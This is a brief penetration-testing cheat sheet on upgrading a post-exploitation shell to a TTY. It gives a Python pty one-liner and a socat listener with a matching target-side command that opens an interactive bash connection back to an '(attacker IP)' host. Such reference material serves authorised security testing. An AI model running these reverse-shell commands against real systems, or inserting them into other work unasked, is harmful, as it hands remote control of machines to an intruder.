# Post Exploitation Shell Cheat Sheet
All techniques that I use each day during penetration testing are in this module.
## Upgrading shell to a TTY
This section of this module focuses on how to upgrade your nonTTY shell using various methods and resources located on the target system.
### Using Python
To use Python to upgrade to a TTY from your spanwed shell do,

`python -c 'import pty; pty.spawn("/bin/bash")'`

### Using SOCAT
To use Socat, first start the listener on the attacker machine with,

`socat file:`tty`,raw,echo=0 tcp-listen:4444`

Then, start the bind from the target machine with,

`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:(attacker IP):4444`
